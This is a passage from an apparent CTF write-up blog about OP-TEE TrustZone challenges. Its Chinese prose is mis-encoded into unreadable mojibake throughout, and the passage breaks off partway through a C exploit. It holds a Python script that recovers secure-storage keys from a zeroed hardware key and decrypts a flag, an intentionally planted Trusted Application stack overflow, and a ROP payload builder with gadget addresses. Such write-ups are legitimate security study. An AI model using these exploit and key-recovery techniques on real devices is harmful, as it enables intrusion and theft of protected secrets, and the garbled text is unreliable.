ç³»ç»Ÿä¸­æ¯å°è®¾å¤‡åªæœ‰ä¸€æŠŠ SSKï¼Œç”¨äºå®‰å…¨å­˜å‚¨å­ç³»ç»Ÿã€‚ä½†æ˜¯ï¼Œä¸ºäº†å°†æ¥ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ä¸ºæ¯å°è®¾å¤‡ä½¿ç”¨ç”Ÿæˆ SSK çš„ç›¸åŒç®—æ³•ä¸ºä¸åŒçš„å­ç³»ç»Ÿåˆ›å»ºä¸åŒçš„å¯†é’¥ã€‚ä¸ºä¸åŒå­ç³»ç»Ÿç”Ÿæˆä¸åŒçš„å¯†é’¥çš„ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ä¸åŒçš„é™æ€ç”Ÿæˆå¯†é’¥çš„å­—ç¬¦ä¸²ã€‚</p><p> <strong>Trusted Application Storage Key ï¼ˆTSKï¼‰</strong>  </p><p>TAå­˜å‚¨å¯†é’¥</p><p>TSKæ˜¯æ¯ä¸ªå—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºå¯†é’¥ï¼Œç”±SSKå’ŒTAçš„æ ‡è¯†ç¬¦ï¼ˆUUIDï¼‰ç”Ÿæˆã€‚å®ƒè¢«ç”¨æ¥ä¿æŠ¤FEKï¼Œæ¢å¥è¯è¯´ï¼Œç”¨æ¥åŠ å¯†/è§£å¯†FEKã€‚</p><p>ä»£ç å®ç°ï¼š<code>build/optee_os/core/tee/tee_fs_key_manager.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uuid) &#123;</span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, uuid, <span class="keyword">sizeof</span>(*uuid));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pick something of a different size than TEE_UUID to</span></span><br><span class="line"><span class="comment"> * guarantee that there&#x27;s never a conflict.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> dummy[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, dummy, <span class="keyword">sizeof</span>(dummy));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_hmac è¿™é‡Œä½¿ç”¨çš„æ˜¯ HMAC_SHA256</p><p>æœ€åå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSK &#x3D; HMACSHA256 (SSK, TA_UUID)</span><br></pre></td></tr></table></figure><p><strong>File Encryption Key ï¼ˆFEKï¼‰</strong> </p><p>å½“ä¸€ä¸ªæ–°çš„TEEæ–‡ä»¶è¢«åˆ›å»ºæ—¶ï¼Œå¯†é’¥ç®¡ç†å™¨å°†é€šè¿‡ PRNGï¼ˆpesudoéšæœºæ•°ç”Ÿæˆå™¨ï¼‰ä¸ºTEEæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ FEKï¼Œå¹¶å°†åŠ å¯†çš„ FEK å­˜å‚¨åœ¨ meta æ–‡ä»¶ä¸­ã€‚FEK ç”¨äºå¯¹å­˜å‚¨åœ¨ meta æ–‡ä»¶ä¸­çš„TEEæ–‡ä»¶ä¿¡æ¯æˆ–å—æ–‡ä»¶ä¸­çš„æ•°æ®è¿›è¡ŒåŠ å¯†/è§£å¯†ã€‚</p><h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h4><p>é€šè¿‡é€†å‘å’Œæ¯”å¯¹OP-Teeçš„æºä»£ç ï¼Œå¸Œæœ›é€‰æ‰‹èƒ½å‘ç° <code>HUK</code>æ²¡æœ‰è¢«è®¾ç½®ã€‚ç„¶åflagè¢«åŠ å¯†äº†ä¸”å­˜å‚¨åœ¨ <code>/data/tee/2</code> æ–‡ä»¶é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TEE_Result __fastcall <span class="title">tee_otp_get_hw_unique_key</span><span class="params">(tee_hw_unique_key *hwkey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(hwkey, <span class="number">0</span>, <span class="keyword">sizeof</span>(tee_hw_unique_key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåªè¦åˆ†æä¸‹å®‰å…¨å­˜å‚¨çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒå¦‚å›¾ï¼š</p><p><a href="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" title="Block Data Encryption" class="gallery-item"><img src="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" alt="Block Data Encryption"></a></p><p>æ€è·¯å°±å¤§æ¦‚æ˜¯</p><ol><li>é€šè¿‡ <code>HUK </code> å’Œ <code>chip id</code> è®¡ç®—å‡º <code>SSK</code></li><li>é€šè¿‡è®¡ç®—å‡ºæ¥çš„<code>SSk</code> å’Œ <code>TA UUID</code>è®¡ç®—å‡º <code>TSK</code></li><li>é€šè¿‡è®¡ç®—å‡ºçš„ <code>TSK</code> å’Œ è¢«åŠ å¯†çš„ <code>FEK</code> è®¡ç®—å‡ºæ˜æ–‡ <code>FEK</code> </li><li>æœ€åé€šè¿‡ <code>FEK</code> è§£å‡ºæ˜æ–‡çš„æ•°æ®</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" title="image-20220124142822275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" alt="image-20220124142822275"></a></p><p>å…¶ä¸­è¢«åŠ å¯†çš„ <code>FEK</code> å­˜å‚¨åœ¨ <code>/data/tee/2</code> æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹ 010 tempteç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;--- 010 Editor v10.0.2 Binary Template</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;      File: </span><br><span class="line">&#x2F;&#x2F;   Authors: </span><br><span class="line">&#x2F;&#x2F;   Version: </span><br><span class="line">&#x2F;&#x2F;   Purpose: </span><br><span class="line">&#x2F;&#x2F;  Category: </span><br><span class="line">&#x2F;&#x2F; File Mask: </span><br><span class="line">&#x2F;&#x2F;  ID Bytes: </span><br><span class="line">&#x2F;&#x2F;   History: </span><br><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_FEK_SIZE 16</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_meta &#123;</span><br><span class="line">UINT64 length;</span><br><span class="line">&#125;tee_fs_htree_meta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_imeta &#123;</span><br><span class="line">struct tee_fs_htree_meta meta;</span><br><span class="line">UINT32 max_node_id;</span><br><span class="line">    UINT32 nop;</span><br><span class="line">&#125;tee_fs_htree_imeta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_image &#123;</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">UCHAR enc_fek[TEE_FS_HTREE_FEK_SIZE];</span><br><span class="line">UCHAR imeta[sizeof(struct tee_fs_htree_imeta)];</span><br><span class="line">UINT32 counter;</span><br><span class="line">&#125;tee_fs_htree_image;</span><br><span class="line"></span><br><span class="line">#define TEE_FS_HTREE_HASH_SIZE32</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">typedef struct _tee_fs_htree_node_image &#123;</span><br><span class="line">&#x2F;* Note that calc_node_hash() depends on hash first in struct *&#x2F;</span><br><span class="line">UCHAR hash[TEE_FS_HTREE_HASH_SIZE];</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">USHORT flags;</span><br><span class="line">&#125;tee_fs_htree_node_image;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;--------------------------------------</span><br><span class="line">LittleEndian();</span><br><span class="line"></span><br><span class="line">tee_fs_htree_image  ver0_head;</span><br><span class="line">tee_fs_htree_image  ver1_head;</span><br><span class="line">FSeek(0x1000);</span><br><span class="line">tee_fs_htree_node_image ver0_root_node;</span><br><span class="line">tee_fs_htree_node_image ver1_root_node;</span><br><span class="line">FSeek(0x2000);</span><br></pre></td></tr></table></figure><h4 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h4><p>æœ€åè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> HMAC, SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#è®¡ç®—ssk</span></span><br><span class="line">    huk = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    chip_id = <span class="string">b&#x27;BEEF&#x27;</span> * <span class="number">8</span></span><br><span class="line">    print(chip_id)</span><br><span class="line">    ssk_str = <span class="string">b&#x27;ONLY_FOR_tee_fs_ssk\x00&#x27;</span></span><br><span class="line">    m = HMAC.new(huk, digestmod=SHA256)</span><br><span class="line">    m.update(chip_id)</span><br><span class="line">    m.update(ssk_str)</span><br><span class="line">    ssk = m.digest()</span><br><span class="line">    print(ssk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è®¡ç®—tsk</span></span><br><span class="line">    ta_uuid = <span class="string">b&#x27;\xbb\x50\xe7\xf4\x37\x14\xbf\x4f\x87\x85\x8d\x35\x80\xc3\x49\x94&#x27;</span> <span class="comment">#taçš„uuid</span></span><br><span class="line">    m = HMAC.new(ssk, digestmod=SHA256)</span><br><span class="line">    m.update(ta_uuid)</span><br><span class="line">    tsk = m.digest()</span><br><span class="line">    print(tsk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è§£fek</span></span><br><span class="line">    enc_fek = <span class="string">b&#x27;\xe4\x9a\x95\xf2\xb5\xf4\x9c\x04\xf6\x07\x9f\xfb\xf0\x2e\xd2\xef&#x27;</span>  <span class="comment">#2åœ¨headeré‡Œ</span></span><br><span class="line">    cipher = AES.new(tsk, AES.MODE_ECB)</span><br><span class="line">    fek = cipher.decrypt(enc_fek)</span><br><span class="line">    print(fek)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#è§£æ•°æ®</span></span><br><span class="line">    enc_data = <span class="string">b&#x27;....&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;\xb4\xc9\x6a\x22\xe6\x36\x72\xcf\x6a\x44\x8f\x10\xa3\x11\x44\x68&#x27;</span> <span class="comment">#å¯¹åº”node</span></span><br><span class="line">    cipher = AES.new(fek, AES.MODE_GCM, nonce=iv)</span><br><span class="line">    data = cipher.decrypt(enc_data)</span><br><span class="line">    print(data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="UnTrustZone"><a href="#UnTrustZone" class="headerlink" title="UnTrustZone"></a>UnTrustZone</h3><p>é¢˜ç›®æè¿°</p><blockquote><p>UntrustZone</p><p>Score: <em>500</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pwn&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>It is clearly not worth your trust.</p><p>The default username is root.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.243.205.105 8899</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/UnstrustZone_d9d2151c29fa340f80f38197492001fe.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR-1"><a href="#TL-DR-1" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>è¿™ä¸ªé¢˜éœ€è¦è¡¥å……ä¸€äº›å…³äº <code>TrustZone</code> çš„å¦å¤–ä¸€éƒ¨åˆ†å…³äº <code>TA</code>å’Œ<code>CA</code>çš„å‰ç½®çŸ¥è¯†ã€‚ <code>TA</code> æ˜¯ Trusted Application çš„ç¼©å†™ï¼Œé€šå¸¸è¿è¡Œåœ¨ TEE ç¯å¢ƒä¸‹çš„åº”ç”¨ç®€ç§°ä¸º<code> TA</code>ã€‚<code>CA</code> æ˜¯ Client Application çš„ç¼©å†™ï¼Œé€šå¸¸è¿è¡Œåœ¨ REE ç¯å¢ƒä¸‹çš„åº”ç”¨ç®€ç§°ä¸º CAã€‚</p><p>ä¸€ä¸ªè®¿é—®å®‰å…¨OSçš„æœåŠ¡æµç¨‹ä¸ºï¼šæ‰“å¼€ TEE ç¯å¢ƒ &gt; å¼€å¯ä¸€ä¸ªä¼šè¯ &gt; å‘é€å‘½ä»¤ &gt; è·å–ä¿¡æ¯ &gt; ç»“æŸä¼šè¯ &gt; å…³é—­ TEE ç¯å¢ƒã€‚</p><p>å€ŸåŠ©OP-TEEæ¥å®ç°ç‰¹å®šå®‰å…¨éœ€æ±‚æ—¶ï¼Œä¸€æ¬¡å®Œæ•´çš„åŠŸèƒ½è°ƒç”¨ä¸€èˆ¬éƒ½æ˜¯èµ·æºäºCAï¼ŒTAåšå…·ä½“åŠŸèƒ½å®ç°å¹¶è¿”å›æ•°æ®åˆ°CAï¼Œè€Œæ•´ä¸ªè¿‡ç¨‹éœ€è¦ç»è¿‡OP-TEEçš„clientç«¯æ¥å£ï¼ŒOP-TEEåœ¨Linux kernelç«¯çš„é©±åŠ¨ï¼ŒMonitoræ¨¡å¼ä¸‹çš„SMCå¤„ç†ï¼ŒOP-TEE OSçš„threadå¤„ç†ï¼ŒOP-TEEä¸­çš„TAç¨‹åºè¿è¡Œï¼ŒOP-TEEç«¯åº•å±‚åº“æˆ–è€…ç¡¬ä»¶èµ„æºæ”¯æŒç­‰å‡ ä¸ªé˜¶æ®µã€‚å½“TAæ‰§è¡Œå®Œå…·ä½“è¯·æ±‚ä¹‹åä¼šæŒ‰ç…§åŸè·¯å¾„å°†å¾—åˆ°çš„æ•°æ®è¿”å›ç»™CAã€‚</p><h4 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h4><p>è®¾è®¡è¿™ä¸ªé¢˜ç›®çš„æ—¶å€™ï¼Œå°±åªæ˜¯æƒ³è®©é€‰æ‰‹äº†è§£ä¸‹ <code>TA</code> è¿™ä¸ªæ”»å‡»é¢ï¼Œæ‰€ä»¥æ¼æ´è®¾è®¡çš„å¾—ç‰¹åˆ«ç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªåœ¨<code>TA</code>ä¸­çš„æ ˆæº¢å‡ºï¼Œæˆ‘ä¿®æ”¹äº†é™„ä»¶ä¸­çš„<code>HUK</code>å’Œç­¾åæ—¶å€™çš„ key è®©ä»–ä¿æŒäºè¿œç¨‹çš„ä¸ä¸€è‡´ã€‚å¸Œæœ›é€‰æ‰‹é€šè¿‡ Pwn è¿™ä¸ª TAï¼Œ æ¥è·å– å®‰å…¨å­˜å‚¨ï¼Œå³ <code>/data/tee/2</code> ä¸‹è¢«åŠ å¯†çš„ flag ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data_sz = params[<span class="number">1</span>].memref.size;</span><br><span class="line"><span class="comment">// data = TEE_Malloc(data_sz, 0); patch for challenge</span></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x20</span>] ;</span><br><span class="line"><span class="keyword">if</span> (!data)</span><br><span class="line"><span class="keyword">return</span> TEE_ERROR_OUT_OF_MEMORY;</span><br><span class="line">TEE_MemMove(data, params[<span class="number">1</span>].memref.buffer, data_sz);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h5><p>å‚è€ƒï¼š <a href="https://github.com/ForgeRock/optee-build/blob/master/docs/debug.md#debugging-op-tee">optee-build/debug.md at master Â· ForgeRock/optee-build (github.com)</a></p><ul><li>æœ‰ æºç è°ƒè¯•ï¼š</li></ul><p>é¦–å…ˆå¯¹ ldelf çš„å…¥å£ä¸‹æ–­ï¼Œ <code>b thread_enter_user_mode</code></p><p>ç„¶åæ‰§è¡Œ CA ç¨‹åºï¼Œåœ¨ LOG çª—å£ä¸­æ‰¾åˆ° TA çš„åŠ è½½åœ°å€<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png"></a></p><p>ç„¶åå¯¹ TA å…¥å£ä¸‹æ–­ï¼Œ <code>b *(baseaddr + TA_InvokeCommandEntryPoint_addr</code></p><ul><li><p>æ— æºç è°ƒè¯•</p><p>OP-TEE æœ‰æ—¥å¿—åŠŸèƒ½ï¼Œåœ¨æ—¥å¿—åŠŸèƒ½ä¸­èƒ½çœ‹åˆ° TA çš„åŠ è½½åœ°å€ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªè¿›è¡Œè°ƒè¯•</p></li></ul><h5 id="å†…å­˜å¸ƒå±€"><a href="#å†…å­˜å¸ƒå±€" class="headerlink" title="å†…å­˜å¸ƒå±€"></a>å†…å­˜å¸ƒå±€</h5><table><thead><tr><th>Text Address</th><th>File Name</th><th>Description</th></tr></thead><tbody><tr><td>0x0</td><td>bl1.elf</td><td>ARM Trusted Firmware Boot Loader Stage 1</td></tr><tr><td>0x1070</td><td>libteec.so</td><td>OP-TEE Client Shared Library [Normal World]</td></tr><tr><td>0x4009c0</td><td><CA></td><td>Client Application [Normal World]</td></tr><tr><td>0xe01b000</td><td>bl2.elf</td><td>ARM Trusted Firmware Boot Loader Stage 2</td></tr><tr><td>0xe040000</td><td>bl31.elf</td><td>ARM Trusted Firmware Boot Loader Stage 3-1</td></tr><tr><td>0xe100000</td><td>tee.elf</td><td>OP-TEE</td></tr><tr><td>0xffff000008081000</td><td>vmlinux</td><td>Linux Kernel [Normal World]</td></tr></tbody></table><ul><li>usermod</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user modeå†…å­˜å¸ƒå±€</span><br><span class="line">E&#x2F;LD:  region  0: va 0x40004000 pa 0x0e300000 size 0x002000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  1: va 0x40006000 pa 0x0e302000 size 0x008000 flags r-xs (ldelf)</span><br><span class="line">E&#x2F;LD:  region  2: va 0x4000e000 pa 0x0e30a000 size 0x001000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  3: va 0x4000f000 pa 0x0e30b000 size 0x004000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  4: va 0x40013000 pa 0x0e30f000 size 0x001000 flags r--s</span><br><span class="line">E&#x2F;LD:  region  5: va 0x40014000 pa 0x0e32e000 size 0x001000 flags rw-s (stack)</span><br><span class="line">E&#x2F;LD:  region  6: va 0x40015000 pa 0x5f60a888 size 0x001000 flags rw-- (param)</span><br><span class="line">E&#x2F;LD:  region  7: va 0x4004d000 pa 0x00001000 size 0x012000 flags r-xs [0]</span><br><span class="line"> &#x2F;&#x2F;éšæœº </span><br><span class="line">E&#x2F;LD:  region  8: va 0x4005f000 pa 0x00013000 size 0x00c000 flags rw-s [0]</span><br><span class="line"> &#x2F;&#x2F;éšæœº</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬è€Œè¨€ï¼š ldelf  åŠ è½½åœ°å€æ˜¯å›ºå®šçš„ï¼Œ å¤„ç†ä»£ç ä½äº <code> build/optee*os/core/arch/arm/kernel/ldelf_loader.c</code></p><p><code>ldelf_load_ldelf</code> å‡½æ•°ä¸­ï¼Œ æœ€ååŠ è½½çš„baseä¸º  0x40006000, å…·ä½“ä»£ç å¯è§<code>build/optee_os/core/arch/arm/kernel/ldelf_loader.c</code></p><h4 id="Solved-1"><a href="#Solved-1" class="headerlink" title="Solved"></a>Solved</h4><p>è§£é¢˜å…³é”®æ˜¯éœ€è¦äº†è§£æ²¡æ³•ç›´æ¥è§£å¯†çš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•è¯»å– flagï¼š</p><ol><li>TEE_AllocatePersistentObjectEnumerator</li><li>TEE_GetNextPersistentObject</li><li>TEE_OpenPersistentObject</li><li>TEE_ReadObjectData</li><li>memcpy data to buffer</li></ol><p>é¦–å…ˆï¼Œ <code>ldefl</code> åŠ è½½åŸºåœ°å€æ˜¯ä¸å˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸Šè¾¹æ‰¾ gadget ï¼Œ å¦å¤–è™½ç„¶ <code>TA</code>æœ‰éšæœºåŒ–ï¼Œä½†æ˜¯è¿™éšæœºåŒ–å¹¶ä¸æ˜¯å¾ˆé«˜ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´è§£å†³ã€‚æ‰€ä»¥ <code>TA</code> çš„ç¨‹åºä¹Ÿæ˜¯æ‰¾ gadget çš„ç›®æ ‡ä¹‹ä¸€ã€‚ldefl ç¨‹åºçš„ä»£ç æ®µæ˜¯è¢«é€šè¿‡ <code>ldelf_load_ldelf</code> å‡½æ•°æ˜¯å†™æ­»åœ¨ <code>bl32_extra1.bin</code>ä¸­çš„ã€‚</p><p>æœ€åæˆ‘ä»¬æ‰¾åˆ°çš„äº†å‡ ä¸ªå¯ä»¥è®¾ç½® 5 ä¸ªå‚æ•°çš„ gadgetã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">CallFun5</span><span class="params">(TEEC_Session* sess,<span class="keyword">uint64_t</span> func,<span class="keyword">uint64_t</span> x0,<span class="keyword">uint64_t</span> x1,<span class="keyword">uint64_t</span> x2,<span class="keyword">uint64_t</span> x3,<span class="keyword">uint64_t</span> x4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//å­˜æ”¾è¿”å›å†…å­˜çš„åœ°å€åœ¨ï¼šg_ta_addr+124D8</span></span><br><span class="line"><span class="comment">//è¿”å›åœ°å€0x00000000400152b0</span></span><br><span class="line">payload = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memset</span>(payload,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(payload,tmp,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tmplen 0x%lx \n&quot;</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">48</span>) = <span class="number">0x40015150</span>;  <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">56</span>) = <span class="number">0x40004008</span>;  <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">40</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000003a28</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>) = x1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>; <span class="comment">//next x1  [x19+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x1 == [x19+0x10]</span></span><br><span class="line"><span class="comment">//0x0000000000003a28: ldr x1, [x19, #0x10]; add x0, x0, x1; str x0, [x20]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret;</span></span><br><span class="line">*(<span class="keyword">uint32_t</span>*)(payload+<span class="number">108</span>) = <span class="number">0x40015777</span>; <span class="comment">//next 19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>) = <span class="number">0x40014ff8</span>; <span class="comment">//next 20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">64</span>) = <span class="number">0x40004010</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span 